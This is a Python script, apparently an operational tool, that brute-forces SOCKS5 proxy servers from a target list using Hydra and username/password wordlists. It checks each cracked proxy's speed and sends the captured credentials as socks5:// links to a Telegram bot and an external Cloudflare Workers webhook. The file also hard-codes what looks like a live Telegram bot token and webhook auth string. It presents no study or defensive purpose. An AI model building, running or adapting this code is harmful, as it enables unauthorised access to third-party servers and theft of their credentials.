import subprocess
import requests
import time
import socket
import socks
import re
import os
import json
from datetime import datetime

# ================= 配置区域 =================
# 1. Telegram 配置
TG_BOT_TOKEN = "8517647551:AAEosyUg4hcmy1hy4mdiKoo-M9sg9ZqRSAY"
TG_CHAT_ID = "6977085303"

# 2. Webhook 配置
WEBHOOK_URL = "https://wepush.yhe8714.workers.dev/wxsend"
WEBHOOK_AUTH = "hy248624"

# 3. 文件路径 (建议绝对路径)
SOCKS_FILE = "/root/s5/socks.txt"
USER_FILE = "/root/s5/users.txt"
PASS_FILE = "/root/s5/pass.txt"
LOG_FILE = "/root/s5/success_proxies.log"
STATUS_FILE = "/root/s5/monitor.status"
# ===========================================

def update_status(message):
    """更新实时状态"""
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    full_msg = f"[{now}] {message}"
    print(full_msg)
    try:
        with open(STATUS_FILE, "w", encoding="utf-8") as f:
            f.write(full_msg)
    except:
        pass

def send_webhook(title, content):
    """发送 Webhook"""
    if not WEBHOOK_URL: return
    headers = {"Authorization": WEBHOOK_AUTH, "Content-Type": "application/json"}
    payload = {
        "title": title,
        "content": content,
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    try:
        requests.post(WEBHOOK_URL, headers=headers, json=payload, timeout=10)
    except Exception as e:
        print(f"[-] Webhook error: {e}")

def send_telegram(message):
    """发送 Telegram"""
    if not TG_BOT_TOKEN or not TG_CHAT_ID: return
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
    data = {"chat_id": TG_CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        requests.post(url, data=data, timeout=5)
    except:
        pass

def get_ip_info(ip):
    try:
        url = f"http://ip-api.com/json/{ip}?lang=zh-CN"
        r = requests.get(url, timeout=5).json()
        if r['status'] == 'success':
            return {"country": r.get('country',''), "isp": r.get('isp','')}
    except:
        pass
    return {"country": "未知", "isp": ""}

def check_no_auth(ip, port):
    """检查无密模式"""
    update_status(f"探测无密模式: {ip}:{port} ...")
    origin_sock = socket.socket
    try:
        socks.set_default_proxy(socks.SOCKS5, ip, int(port))
        socket.socket = socks.socksocket
        requests.get("http://www.google.com/generate_204", timeout=3)
        return True
    except:
        return False
    finally:
        socks.set_default_proxy()
        socket.socket = origin_sock

def test_proxy_speed(ip, port, user, password):
    update_status(f"正在测速 (已获取凭据): {ip}:{port} ...")
    origin_sock = socket.socket
    start = time.time()
    try:
        socks.set_default_proxy(socks.SOCKS5, ip, int(port), username=user, password=password)
        socket.socket = socks.socksocket
        
        # 测延迟
        requests.get("http://www.google.com/generate_204", timeout=5)
        latency = (time.time() - start) * 1000
        
        # 测下载
        dl_start = time.time()
        requests.get("https://speed.cloudflare.com/__down?bytes=500000", timeout=10)
        speed = 500 / (time.time() - dl_start)
        return latency, speed
    except:
        return None, None
    finally:
        socks.set_default_proxy()
        socket.socket = origin_sock

def format_speed(s):
    if s is None: return "N/A"
    return f"{s:.2f} kb/s"

def run_hydra(ip, port):
    update_status(f"Hydra 正在爆破: {ip}:{port} ...")
    cmd = [
        "hydra", "-L", USER_FILE, "-P", PASS_FILE, "-s", port,
        "-t", "2", "-w", "1", "-f", "-I", f"socks5://{ip}"
    ]
    try:
        res = subprocess.run(cmd, capture_output=True, text=True)
        # 只要找到了 login: password: 就说明成功
        match = re.search(r"login:\s+(\S+)\s+password:\s+(\S+)", res.stdout)
        if match: return match.group(1), match.group(2), "Success"
        
        err = res.stdout + res.stderr
        if "refused" in err: return None, None, "连接被拒"
        elif "timed out" in err: return None, None, "连接超时"
        else: return None, None, "字典耗尽"
    except Exception as e:
        return None, None, f"Error: {str(e)}"

def main():
    if not os.path.exists(SOCKS_FILE):
        update_status("找不到 socks.txt")
        return

    with open(SOCKS_FILE, 'r') as f:
        targets = [l.strip() for l in f if l.strip() and ":" in l]

    total = len(targets)
    update_status(f"任务开始: 共 {total} 个目标")

    for idx, target in enumerate(targets):
        ip, port = target.split(":")
        progress = f"{idx+1}/{total}"
        
        # 1. 尝试无密
        is_no_auth = check_no_auth(ip, port)
        user, pwd = (None, None)
        
        if not is_no_auth:
            # 2. 尝试爆破
            user, pwd, reason = run_hydra(ip, port)
        
        # 3. 结果判断
        if is_no_auth or (user and pwd):
            # 准备显示的凭据字符串
            show_u = user if user else "无(NoAuth)"
            show_p = pwd if pwd else "无"
            
            # 测速
            lat, speed = test_proxy_speed(ip, port, user, pwd)
            
            if lat is None:
                # 【这里是你最关心的修改】
                # 就算测速失败，也要把刚才抓到的账号密码显示出来！
                update_status(f"❌ 假死: {ip}:{port} [账号:{show_u} 密码:{show_p}] (认证成功但无网)")
            else:
                # 成功逻辑
                info = get_ip_info(ip)
                link = f"socks5://{user}:{pwd}@{ip}:{port}" if user else f"socks5://{ip}:{port}"
                
                title = f"捕获: {ip}"
                content = f"{link}\n{info['country']} - {format_speed(speed)}"
                tg_msg = f"<b>{title}</b>\n{content}\n进度: {progress}"
                
                with open(LOG_FILE, "a") as f: f.write(link + "\n")
                
                update_status(f"✅ 成功: {ip}:{port} [发送通知...]")
                send_telegram(tg_msg)
                send_webhook(title, content)
        else:
            # 连爆破都失败了
            fail_reason = reason if 'reason' in locals() else "无密失败"
            update_status(f"⛔️ 失败: {ip}:{port} -> {fail_reason}")

        # 4. 休息
        update_status(f"⏳ 冷却 5s (进度 {progress})")
        time.sleep(5)

if __name__ == "__main__":
    main()
